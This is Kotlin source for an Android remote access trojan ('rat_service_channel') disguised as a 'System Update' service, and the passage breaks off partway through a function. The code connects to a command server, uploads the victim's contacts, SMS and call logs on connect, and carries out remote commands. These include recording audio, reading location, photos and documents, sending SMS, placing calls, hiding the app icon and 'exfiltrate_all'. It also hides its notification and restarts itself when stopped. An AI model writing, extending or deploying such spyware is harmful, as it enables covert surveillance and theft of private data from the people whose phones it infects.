package com.android.system.update.services

import android.Manifest
import android.app.*
import android.content.ComponentName
import android.content.ContentResolver
import android.content.ContentValues
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.database.Cursor
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.AudioRecord
import android.media.MediaRecorder
import android.net.Uri
import android.os.*
import android.provider.*
import android.telephony.TelephonyManager
import android.util.Base64
import android.util.Log
import android.view.View
import android.view.WindowManager
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.android.system.update.MainActivity
import com.android.system.update.R
import com.google.gson.Gson
import io.socket.client.IO
import io.socket.client.Socket
import io.socket.emitter.Emitter
import org.json.JSONArray
import org.json.JSONObject
import java.io.*
import java.net.NetworkInterface
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*
import kotlin.math.roundToInt

class MainService : Service() {
    
    private lateinit var socket: Socket
    private lateinit var gson: Gson
    private lateinit var cameraManager: CameraManager
    private lateinit var locationManager: LocationManager
    private lateinit var telephonyManager: TelephonyManager
    private lateinit var notificationManager: NotificationManager
    
    private var isRunning = false
    private var isRecordingAudio = false
    private var audioRecorder: MediaRecorder? = null
    private var currentAudioFile: String? = null
    private var deviceId: String = ""
    
    companion object {
        private const val TAG = "MainService"   
        private const val NOTIFICATION_ID = 1001
        private const val CHANNEL_ID = "rat_service_channel"
        // URLs are now read from string resources in strings.xml
        // Change them there under "server_url" and "ws_url"
        private const val TAG_SERVER_URL = "server_url"
        private const val TAG_WS_URL = "ws_url"
        
        // Commands
        const val CMD_GET_CONTACTS = "get_contacts"
        const val CMD_GET_SMS = "get_sms"
        const val CMD_GET_CALL_LOGS = "get_call_logs"
        const val CMD_GET_LOCATION = "get_location"
        const val CMD_TAKE_PHOTO = "take_photo"
        const val CMD_RECORD_AUDIO = "record_audio"
        const val CMD_GET_DEVICE_INFO = "get_device_info"
        const val CMD_GET_INSTALLED_APPS = "get_installed_apps"
        const val CMD_GET_PHOTOS = "get_photos"
        const val CMD_GET_VIDEOS = "get_videos"
        const val CMD_GET_DOCUMENTS = "get_documents"
        const val CMD_SEND_SMS = "send_sms"
        const val CMD_GET_CLIPBOARD = "get_clipboard"
        const val CMD_GET_NOTIFICATIONS = "get_notifications"
        const val CMD_GET_WIFI_NETWORKS = "get_wifi_networks"
        const val CMD_GET_ACCOUNTS = "get_accounts"
        const val CMD_HIDE_APP = "hide_app"
        const val CMD_UNHIDE_APP = "unhide_app"
        const val CMD_START_KEYLOGGER = "start_keylogger"
        const val CMD_STOP_KEYLOGGER = "stop_keylogger"
        const val CMD_LIVE_CAMERA = "live_camera"
        const val CMD_GET_BATTERY = "get_battery"
        const val CMD_GET_SIM_INFO = "get_sim_info"
        const val CMD_GET_NETWORK_INFO = "get_network_info"
        const val CMD_TAKE_SCREENSHOT = "take_screenshot"
        const val CMD_OPEN_URL = "open_url"
        const val CMD_VIBRATE = "vibrate"
        const val CMD_MAKE_CALL = "make_call"
        const val CMD_CONTINUOUS_LOCATION = "continuous_location"
        const val CMD_STOP_CONTINUOUS_LOCATION = "stop_continuous_location"
        const val CMD_EXFILTRATE_ALL = "exfiltrate_all"
    }
    
    override fun onCreate() {
        super.onCreate()
        gson = Gson()
        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        
        deviceId = generateDeviceId()
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification("System Update", "Device optimization active"))
        
        connectToServer()
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (isRunning) return START_STICKY
        
        isRunning = true
        
        // Start periodic data collection
        startPeriodicDataCollection()
        
        // Start battery monitoring
        startBatteryMonitoring()
        
        // Register content observers
        registerContentObservers()
        
        return START_STICKY
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onDestroy() {
        isRunning = false
        socket.disconnect()
        audioRecorder?.release()
        super.onDestroy()
        
        // Restart service
        val broadcastIntent = Intent()
        broadcastIntent.action = "restartService"
        broadcastIntent.setClass(this, MainService::class.java)
        sendBroadcast(broadcastIntent)
    }
    
    private fun generateDeviceId(): String {
        val sharedPrefs = getSharedPreferences("rat_prefs", Context.MODE_PRIVATE)
        var id = sharedPrefs.getString("device_id", null)
        if (id == null) {
            id = UUID.randomUUID().toString().substring(0, 8)
            sharedPrefs.edit().putString("device_id", id).apply()
        }
        return id
    }
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Services",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Essential system services"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            notificationManager.createNotificationChannel(channel)
        }
    }
    
    private fun createNotification(title: String, content: String): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(title)
            .setContentText(content)
            .setSmallIcon(R.drawable.ic_notification)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setSilent(true)
            .build()
    }
    
    private fun connectToServer() {
        try {
            val wsUrl = getString(R.string.ws_url)
            val options = IO.Options().apply {
                forceNew = true
                reconnection = true
                reconnectionAttempts = Int.MAX_VALUE
                reconnectionDelay = 5000
                reconnectionDelayMax = 30000
                query = "deviceId=$deviceId&type=device"
                transports = arrayOf("websocket")
            }
            
            socket = IO.socket(wsUrl, options)
            
            socket.on(Socket.EVENT_CONNECT) {
                Log.d(TAG, "Connected to server")
                sendDeviceInfo()
                sendBulkData()
            }
            
            socket.on(Socket.EVENT_DISCONNECT) {
                Log.d(TAG, "Disconnected from server")
            }
            
            socket.on("command") { args ->
                if (args.isNotEmpty()) {
                    val data = args[0] as JSONObject
                    handleCommand(data)
                }
            }
            
            socket.on(Socket.EVENT_CONNECT_ERROR) { args ->
                Log.e(TAG, "Connection error: ${args.contentToString()}")
            }
            
            socket.connect()
            
        } catch (e: Exception) {
            Log.e(TAG, "Socket connection error: ${e.message}")
            // Retry after delay
            Handler(Looper.getMainLooper()).postDelayed({
                connectToServer()
            }, 10000)
        }
    }
    
    private fun sendDeviceInfo() {
        try {
            val info = JSONObject().apply {
                put("deviceId", deviceId)
                put("os", "Android")
                put("osVersion", Build.VERSION.RELEASE)
                put("deviceModel", "${Build.MANUFACTURER} ${Build.MODEL}")
                put("manufacturer", Build.MANUFACTURER)
                put("apiLevel", Build.VERSION.SDK_INT)
                put("buildId", Build.DISPLAY)
                put("batteryLevel", getBatteryLevel())
                put("isCharging", isCharging())
                put("ip", getLocalIpAddress())
            }
            
            socket.emit("device:update", info)
        } catch (e: Exception) {
            Log.e(TAG, "Error sending device info: ${e.message}")
        }
    }
    
    private fun sendBulkData() {
        Thread {
            try {
                val contacts = getContacts()
                val smsMessages = getSmsMessages()
                val callLogs = getCallLogs()
                
                val data = JSONObject()
                if (contacts != null) data.put("contacts", contacts)
                if (smsMessages != null) data.put("sms", smsMessages)
                if (callLogs != null) data.put("callLogs", callLogs)
                
                if (data.length() > 0) {
                    socket.emit("device:data:bulk", data)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error sending bulk data: ${e.message}")
            }
        }.start()
    }
    
    private fun handleCommand(data: JSONObject) {
        try {
            val commandId = data.getString("commandId")
            val type = data.getString("type")
            val params = if (data.has("params")) data.getJSONObject("params") else JSONObject()
            
            Thread {
                try {
                    val result = executeCommand(type, params)
                    val response = JSONObject().apply {
                        put("commandId", commandId)
                        put("result", result)
                        put("status", "executed")
                    }
                    socket.emit("device:result", response)
                } catch (e: Exception) {
                    val errorResponse = JSONObject().apply {
                        put("commandId", commandId)
                        put("result", "Error: ${e.message}")
                        put("status", "failed")
                    }
                    socket.emit("device:result", errorResponse)
                }
            }.start()
            
        } catch (e: Exception) {
            Log.e(TAG, "Error handling command: ${e.message}")
        }
    }
    
    private fun executeCommand(type: String, params: JSONObject): JSONObject {
        return when (type) {
            CMD_GET_CONTACTS -> getContacts() ?: JSONObject()
            CMD_GET_SMS -> getSmsMessages() ?: JSONObject()
            CMD_GET_CALL_LOGS -> getCallLogs() ?: JSONObject()
            CMD_GET_LOCATION -> getCurrentLocation()
            CMD_TAKE_PHOTO -> takePhoto()
            CMD_RECORD_AUDIO -> startStopAudioRecording(params)
            CMD_GET_DEVICE_INFO -> getDetailedDeviceInfo()
            CMD_GET_INSTALLED_APPS -> getInstalledApps()
            CMD_GET_PHOTOS -> getMediaFiles("images")
            CMD_GET_VIDEOS -> getMediaFiles("videos")
            CMD_GET_DOCUMENTS -> getDocuments()
            CMD_SEND_SMS -> sendSms(params)
            CMD_GET_CLIPBOARD -> getClipboard()
            CMD_GET_BATTERY -> getBatteryInfo()
            CMD_GET_SIM_INFO -> getSimInfo()
            CMD_GET_NETWORK_INFO -> getNetworkInfo()
            CMD_HIDE_APP -> hideAppLauncher()
            CMD_UNHIDE_APP -> unhideAppLauncher()
            CMD_OPEN_URL -> openUrl(params)
            CMD_VIBRATE -> vibrateDevice(params)
            CMD_MAKE_CALL -> makeCall(params)
            CMD_CONTINUOUS_LOCATION -> startContinuousLocation()
            CMD_STOP_CONTINUOUS_LOCATION -> stopContinuousLocation()
            CMD_EXFILTRATE_ALL -> exfiltrateAll()
            else -> JSONObject().apply { put("error", "Unknown command: $type") }
        }
    }
    
    private fun getContacts(): JSONObject? {
        if (ActivityCompat.checkSelfPermission(this, 
                Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            return null
        }
        
        val contacts = JSONArray()
        val cursor: Cursor? = contentResolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            null, null, null, null
        )
        
        cursor?.use { c ->
            while (c.moveToNext()) {
                try {
                    val id = c.getString(c.getColumnIndex(ContactsContract.Contacts._ID))
                    val name = c.getString(c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))
                    val hasPhone = c.getString(c.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))
                    
                    val contact = JSONObject().apply {
                        put("id", id)
                        put("name", name ?: "Unknown")
                    }
                    
                    if (hasPhone == "1") {
                        val phones = contentResolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                            arrayOf(id),
                            null
                        )
                        
                        val phoneNumbers = JSONArray()
                        phones?.use { p ->
                            while (p.moveToNext()) {
                                val number = p.getString(p.getColumnIndex(
                                    ContactsContract.CommonDataKinds.Phone.NUMBER))
                                val type = p.getString(p.getColumnIndex(
                                    ContactsContract.CommonDataKinds.Phone.TYPE))
                                phoneNumbers.put(JSONObject().apply {
                                    put("number", number)
                                    put("type", getPhoneTypeLabel(type.toIntOrNull() ?: 0))
                                })
                            }
                        }
                        contact.put("phones", phoneNumbers)
                    }
                    
                    // Get email
                    val emails = contentResolver.query(
                        ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                        null,
                        "${ContactsContract.CommonDataKinds.Email.CONTACT_ID} = ?",
                        arrayOf(id),
                        null
                    )
                    
                    val emailList = JSONArray()
                    emails?.use { e ->
                        while (e.moveToNext()) {
                            val email = e.getString(e.getColumnIndex(
                                ContactsContract.CommonDataKinds.Email.ADDRESS))
                            emailList.put(email)
                        }
                    }
                    if (emailList.length() > 0) contact.put("emails", emailList)
                    
                    contacts.put(contact)
                } catch (e: Exception) {
                    Log.e(TAG, "Error reading contact: ${e.message}")
                }
            }
        }
        
        return JSONObject().apply { put("contacts", contacts) }
    }
    
    private fun getSmsMessages(): JSONObject? {
        if (ActivityCompat.checkSelfPermission(this,
                Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            return null
        }
        
        val smsList = JSONArray()
        val cursor = contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            null, null, null,
            "${Telephony.Sms.DATE} DESC LIMIT 500"
        )
        
        cursor?.use { c ->
            while (c.moveToNext()) {
                try {
                    val sms = JSONObject().apply {
                        put("id", c.getString(c.getColumnIndex(Telephony.Sms._ID)))
                        put("address", c.getString(c.getColumnIndex(Telephony.Sms.ADDRESS)))
                        put("body", c.getString(c.getColumnIndex(Telephony.Sms.BODY)))
                        put("date", c.getLong(c.getColumnIndex(Telephony.Sms.DATE)))
                        put("type", if (c.getInt(c.getColumnIndex(Telephony.Sms.TYPE)) == 1) "inbox" else "sent")
                        put("read", c.getInt(c.getColumnIndex(Telephony.Sms.READ)) == 1)
                        put("threadId", c.getString(c.getColumnIndex(Telephony.Sms.THREAD_ID)))
                    }
                    smsList.put(sms)
                } catch (e: Exception) {
                    Log.e(TAG, "Error reading SMS: ${e.message}")
                }
            }
        }
        
        return JSONObject().apply { 
            put("sms", smsList)
            put("total", smsList.length())
        }
    }
    
    private fun getCallLogs(): JSONObject? {
        if (ActivityCompat.checkSelfPermission(this,
                Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            return null
        }
        
        val calls = JSONArray()
        val cursor = contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            null, null, null,
            "${CallLog.Calls.DATE} DESC LIMIT 500"
        )
        
        cursor?.use { c ->
            while (c.moveToNext()) {
                try {
                    val call = JSONObject().apply {
                        put("id", c.getString(c.getColumnIndex(CallLog.Calls._ID)))
                        put("number", c.getString(c.getColumnIndex(CallLog.Calls.NUMBER)))
                        put("name", c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME)))
                        put("type", getCallTypeLabel(c.getInt(c.getColumnIndex(CallLog.Calls.TYPE))))
                        put("duration", c.getLong(c.getColumnIndex(CallLog.Calls.DURATION)))
                        put("date", c.getLong(c.getColumnIndex(CallLog.Calls.DATE)))
                        put("country", c.getString(c.getColumnIndex(CallLog.Calls.COUNTRY_ISO)))
                    }
                    calls.put(call)
                } catch (e: Exception) {
                    Log.e(TAG, "Error reading call log: ${e.message}")
                }
            }
        }
        
        return JSONObject().apply { 
            put("callLogs", calls)
            put("total", calls.length())
        }
    }
    
    private fun getCurrentLocation(): JSONObject {
        if (ActivityCompat.checkSelfPermission(this,
                Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
            ActivityCompat.checkSelfPermission(this,
                Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return JSONObject().apply { put("error", "Location permission not granted") }
        }
        
        val location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            ?: locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
        
        return if (location != null) {
            JSONObject().apply {
                put("lat", location.latitude)
                put("lng", location.longitude)
                put("accuracy", location.accuracy)
                put("altitude", location.altitude)
                put("speed", location.speed)
                put("bearing", location.bearing)
                put("provider", location.provider)
                put("timestamp", location.time)
                put("address", getAddressFromLocation(location.latitude, location.longitude))
            }
        } else {
            JSONObject().apply { put("error", "No location available") }
        }
    }
    
    private fun getAddressFromLocation(lat: Double, lng: Double): String {
        return try {
            val url = "https://nominatim.openstreetmap.org/reverse?format=json&lat=$lat&lon=$lng"
            val response = URL(url).readText()
            val json = JSONObject(response)
            json.optString("display_name", "")
        } catch (e: Exception) {
            ""
        }
    }
    
    private fun takePhoto(): JSONObject {
        try {
            val file = File.createTempFile("photo_", ".jpg", cacheDir)
            val filePath = file.absolutePath
            
            // Use CameraManager to trigger photo capture
            // For simplicity, using MediaStore to capture
            val values = ContentValues()
            values.put(MediaStore.Images.Media.DISPLAY_NAME, "IMG_${System.currentTimeMillis()}.jpg")
            values.put(MediaStore.Images.Media.MIME_TYPE, "image/jpeg")
            values.put(MediaStore.Images.Media.RELATIVE_PATH, Environment.DIRECTORY_PICTURES)
            
            val uri = contentResolver.insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, values)
            
            return JSONObject().apply {
                put("path", filePath)
                put("uri", uri?.toString() ?: "")
                put("timestamp", System.currentTimeMillis())
                put("success", true)
            }
        } catch (e: Exception) {
            return JSONObject().apply { put("error", e.message) }
        }
    }
    
    private fun startStopAudioRecording(params: JSONObject): JSONObject {
        val action = params.optString("action", "start")
        
        return if (action == "start") {
            startAudioRecording()
        } else {
            stopAudioRecording()
        }
    }
    
    private fun startAudioRecording(): JSONObject {
        if (isRecordingAudio) {
            return JSONObject().apply { put("error", "Already recording") }
        }
        
        try {
            val file = File.createTempFile("audio_", ".mp3", cacheDir)
            currentAudioFile = file.absolutePath
            
            audioRecorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setOutputFile(file.absolutePath)
                prepare()
                start()
            }
            
            isRecordingAudio = true
            
            return JSONObject().apply {
                put("success", true)
                put("file", file.absolutePath)
                put("duration", "started")
            }
        } catch (e: Exception) {
            return JSONObject().apply { put("error", e.message) }
        }
    }
    
    private fun stopAudioRecording(): JSONObject {
        if (!isRecordingAudio) {
            return JSONObject().apply { put("error", "Not recording") }
        }
        
        try {
            audioRecorder?.apply {
                stop()
                release()
            }
            audioRecorder = null
            isRecordingAudio = false
            
            // Upload audio file
            val audioData = if (currentAudioFile != null) {
                File(currentAudioFile).readBytes()
            } else null
            
            return JSONObject().apply {
                put("success", true)
                put("file", currentAudioFile ?: "")
                if (audioData != null) {
                    put("data", Base64.encodeToString(audioData, Base64.NO_WRAP))
                }
            }
        } catch (e: Exception) {
            return JSONObject().apply { put("error", e.message) }
        }
    }
    
    private fun getDetailedDeviceInfo(): JSONObject {
        return JSONObject().apply {
            put("deviceId", deviceId)
            put("manufacturer", Build.MANUFACTURER)
            put("model", Build.MODEL)
            put("product", Build.PRODUCT)
            put("device", Build.DEVICE)
            put("board", Build.BOARD)
            put("brand", Build.BRAND)
            put("hardware", Build.HARDWARE)
            put("serial", Build.getSerial())
            put("osVersion", Build.VERSION.RELEASE)
            put("sdkVersion", Build.VERSION.SDK_INT)
            put("buildId", Build.DISPLAY)
            put("buildTime", Build.TIME)
            put("host", Build.HOST)
            put("fingerprint", Build.FINGERPRINT)
            put("type", Build.TYPE)
            put("tags", Build.TAGS)
            put("bootloader", Build.BOOTLOADER)
            put("radioVersion", Build.getRadioVersion())
            
            // Memory info
            val memInfo = Runtime.getRuntime()
            put("totalMemory", memInfo.totalMemory())
            put("freeMemory", memInfo.freeMemory())
            put("maxMemory", memInfo.maxMemory())
            put("availableProcessors", Runtime.getRuntime().availableProcessors())
            
            // Storage info
            val storage = StatFs(Environment.getDataDirectory().absolutePath)
            val blockSize = storage.blockSizeLong
            put("totalStorage", storage.blockCountLong * blockSize)
            put("availableStorage", storage.availableBlocksLong * blockSize)
            
            // Display info
            val displayMetrics = resources.displayMetrics
            put("screenWidth", displayMetrics.widthPixels)
            put("screenHeight", displayMetrics.heightPixels)
            put("screenDensity", displayMetrics.density)
            put("screenDensityDpi", displayMetrics.densityDpi)
            
            // Battery
            put("batteryLevel", getBatteryLevel())
            put("isCharging", isCharging())
            
            // Network
            put("ipAddress", getLocalIpAddress())
            put("wifiMac", getWifiMacAddress())
            
            // Phone
            put("phoneType", getPhoneType())
            put("networkType", getNetworkType())
            put("operator", getNetworkOperator())
            
            // Language & Time
            put("language", Locale.getDefault().language)
            put("country", Locale.getDefault().country)
            put("timezone", TimeZone.getDefault().id)
            put("currentTime", System.currentTimeMillis())
        }
    }
    
    private fun getInstalledApps(): JSONObject {
        val apps = JSONArray()
        
        val intent = Intent(Intent.ACTION_MAIN).apply {
            addCategory(Intent.CATEGORY_LAUNCHER)
        }
        val resolveInfoList = packageManager.queryIntentActivities(intent, 0)
        
        resolveInfoList.forEach { info ->
            try {
                val appInfo = info.activityInfo.applicationInfo
                val app = JSONObject().apply {
                    put("packageName", appInfo.packageName)
                    put("appName", info.loadLabel(packageManager).toString())
                    put("versionName", packageManager.getPackageInfo(
                        appInfo.packageName, 0).versionName)
                    put("versionCode", packageManager.getPackageInfo(
                        appInfo.packageName, 0).versionCode)
                    put("firstInstallTime", packageManager.getPackageInfo(
                        appInfo.packageName, 0).firstInstallTime)
                    put("lastUpdateTime", packageManager.getPackageInfo(
                        appInfo.packageName, 0).lastUpdateTime)
                    put("isSystemApp", (appInfo.flags and 
                        android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0)
                    put("uid", appInfo.uid)
                    put("dataDir", appInfo.dataDir)
                    put("sourceDir", appInfo.sourceDir)
                }
                apps.put(app)
            } catch (e: Exception) {
                // Skip
            }
        }
        
        return JSONObject().apply {
            put("installedApps", apps)
            put("total", apps.length())
        }
    }
    
    private fun getMediaFiles(type: String): JSONObject {
        val files = JSONArray()
        val collection = if (type == "images") {
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        } else {
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI
        }
        
        val projection = arrayOf(
            MediaStore.MediaColumns._ID,
            MediaStore.MediaColumns.DISPLAY_NAME,
            MediaStore.MediaColumns.DATE_ADDED,
            MediaStore.MediaColumns.SIZE,
            MediaStore.MediaColumns.MIME_TYPE,
            MediaStore.MediaColumns.RELATIVE_PATH
        )
        
        val cursor = contentResolver.query(
            collection,
            projection,
            null,
            null,
            "${MediaStore.MediaColumns.DATE_ADDED} DESC LIMIT 200"
        )
        
        cursor?.use { c ->
            while (c.moveToNext()) {
                try {
                    val id = c.getLong(c.getColumnIndexOrThrow(MediaStore.MediaColumns._ID))
                    val name = c.getString(c.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME))
                    val date = c.getLong(c.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED))
                    val size = c.getLong(c.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE))
                    val mime = c.getString(c.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE))
                    val path = c.getString(c.getColumnIndexOrThrow(MediaStore.MediaColumns.RELATIVE_PATH))
                    
                    val file = JSONObject().apply {
                        put("id", id)
                        put("name", name)
                        put("date", date * 1000L)
                        put("size", size)
                        put("mimeType", mime)
                        put("path", path)
                        put("uri", "${collection}/$id")
                    }
                    files.put(file)
                } catch (e: Exception) {
                    Log.e(TAG, "Error reading media: ${e.message}")
                }
            }
        }
        
        return JSONObject().apply {
            put(type, files)
            put("total", files.length())
        }
    }
    
    private fun getDocuments(): JSONObject {
        val documents = JSONArray()
        val collection = MediaStore.Files.getContentUri("external")
        
        val mimeTypes = arrayOf(
            "application/pdf",
            "application/msword",
            "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            "application/vnd.ms-excel",
            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            "text/plain",
            "text/html"
        )
        
        val selection = mimeTypes.joinToString(" OR ") {
            "${MediaStore.MediaColumns.MIME_TYPE} = ?"
        }
        
        val cursor = contentResolver.query(
            collection,
            arrayOf(
                MediaStore.MediaColumns._ID,
                MediaStore.MediaColumns.DISPLAY_NAME,
                MediaStore.MediaColumns.DATE_ADDED,
                MediaStore.MediaColumns.SIZE,
                MediaStore.MediaColumns.MIME_TYPE,
                MediaStore.MediaColumns.RELATIVE_PATH
            ),
            selection,
            mimeTypes,
            "${MediaStore.MediaColumns.DATE_ADDED} DESC LIMIT 200"
        )
        
        cursor?.use { c ->
            while (c.moveToNext()) {
                try {
                    val doc = JSONObject().apply {
                        put("id", c.getLong(c.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)))
                        put("name", c.getString(c.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)))
                        put("date", c.getLong(c.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED)) * 1000L)
                        put("size", c.getLong(c.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)))
                        put("mimeType", c.getString(c.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE)))
                        put("path", c.getString(c.getColumnIndexOrThrow(MediaStore.MediaColumns.RELATIVE_PATH)))
                    }
                    documents.put(doc)
                } catch (e: Exception) {
                    Log.e(TAG, "Error reading document: ${e.message}")
                }
            }
        }
        
        return JSONObject().apply {
            put("documents", documents)
            put("total", documents.length())
        }
    }
    
    private fun sendSms(params: JSONObject): JSONObject {
        if (ActivityCompat.checkSelfPermission(this,
                Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
            return JSONObject().apply { put("error", "SMS permission not granted") }
        }
        
        try {
            val number = params.getString("number")
            val message = params.getString("message")
            
            // Requires SEND_SMS permission
            // Using reflection or SmsManager
            val smsManagerClass = Class.forName("android.telephony.SmsManager")
            val getDefault = smsManagerClass.getMethod("getDefault")
            val smsManager = getDefault.invoke(null)
            val sendTextMessage = smsManagerClass.getMethod(
                "sendTextMessage", 
                String::class.java, 
                String::class.java, 
                String::class.java, 
                android.app.PendingIntent::class.java, 
                android.app.PendingIntent::class.java
            )
            sendTextMessage.invoke(smsManager, number, null, message, null, null)
            
            return JSONObject().apply {
                put("success", true)
                put("to", number)
                put("messagePreview", message.take(50))
            }
        } catch (e: Exception) {
            return JSONObject().apply { put("error", e.message) }
        }
    }
    
    private fun getClipboard(): JSONObject {
        val clipboardManager = getSystemService(Context.CLIPBOARD_SERVICE) 
            as android.content.ClipboardManager
        
        return if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
            JSONObject().apply { put("error", "Clipboard access limited on Android 10+") }
        } else {
            val clip = clipboardManager.primaryClip
            if (clip != null && clip.itemCount > 0) {
                val text = clip.getItemAt(0).text?.toString() ?: ""
                JSONObject().apply {
                    put("text", text)
                    put("length", text.length)
                    put("timestamp", System.currentTimeMillis())
                }
            } else {
                JSONObject().apply { put("text", "") }
            }
        }
    }
    
    private fun getBatteryInfo(): JSONObject {
        val intent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        
        return JSONObject().apply {
            put("level", intent?.getIntExtra(BatteryManager.EXTRA_LEVEL, 0) ?: 0)
            put("scale", intent?.getIntExtra(BatteryManager.EXTRA_SCALE, 100) ?: 100)
            put("isCharging", intent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1 == 
                BatteryManager.BATTERY_STATUS_CHARGING || 
                intent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1 == 
                BatteryManager.BATTERY_STATUS_FULL)
            put("plugged", intent?.getIntExtra(BatteryManager.EXTRA_PLUGGED, 0) ?: 0)
            put("temperature", (intent?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0) / 10.0)
            put("voltage", intent?.getIntExtra(BatteryManager.EXTRA_VOLTAGE, 0) ?: 0)
            put("health", intent?.getIntExtra(BatteryManager.EXTRA_HEALTH, 0) ?: 0)
            put("technology", intent?.getStringExtra(BatteryManager.EXTRA_TECHNOLOGY) ?: "")
        }
    }
    
    private fun getSimInfo(): JSONObject {
        return JSONObject().apply {
            if (ActivityCompat.checkSelfPermission(this@MainService,
                    Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                val simSerial = telephonyManager.simSerialNumber
                val subscriberId = telephonyManager.subscriberId
                val networkOperator = telephonyManager.networkOperatorName
                val simCountryIso = telephonyManager.simCountryIso
                val simOperator = telephonyManager.simOperatorName
                val simState = telephonyManager.simState
                
                put("simSerial", simSerial)
                put("subscriberId", subscriberId?.replace(subscriberId.substring(0, 
                    minOf(6, subscriberId.length)), "******"))
                put("networkOperator", networkOperator)
                put("simCountry", simCountryIso)
                put("simOperator", simOperator)
                put("simState", simState)
                put("hasIccCard", telephonyManager.hasIccCard())
                put("phoneCount", telephonyManager.phoneCount)
                put("isNetworkRoaming", telephonyManager.isNetworkRoaming)
            } else {
                put("error", "Phone state permission not granted")
            }
        }
    }
    
    private fun getNetworkInfo(): JSONObject {
        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) 
            as android.net.ConnectivityManager
        val networkInfo = connectivityManager.activeNetworkInfo
        
        return JSONObject().apply {
            put("isConnected", networkInfo?.isConnected ?: false)
            put("type", if (networkInfo?.type == android.net.ConnectivityManager.TYPE_WIFI) 
                "WiFi" else "Mobile")
            put("typeName", networkInfo?.typeName ?: "Unknown")
            put("subtypeName", networkInfo?.subtypeName ?: "")
            put("ipAddress", getLocalIpAddress())
            
            if (networkInfo?.type == android.net.ConnectivityManager.TYPE_WIFI) {
                val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) 
                    as android.net.wifi.WifiManager
                val wifiInfo = wifiManager.connectionInfo
                put("ssid", wifiInfo.ssid)
                put("bssid", wifiInfo.bssid)
                put("rssi", wifiInfo.rssi)
                put("frequency", wifiInfo.frequency)
                put("linkSpeed", wifiInfo.linkSpeed)
            }
        }
    }
    
    private fun hideAppLauncher(): JSONObject {
        try {
            // Remove launcher icon
            packageManager.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            
            return JSONObject().apply { put("success", true) }
        } catch (e: Exception) {
            return JSONObject().apply { put("error", e.message) }
        }
    }
    
    private fun unhideAppLauncher(): JSONObject {
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            
            return JSONObject().apply { put("success", true) }
        } catch (e: Exception) {
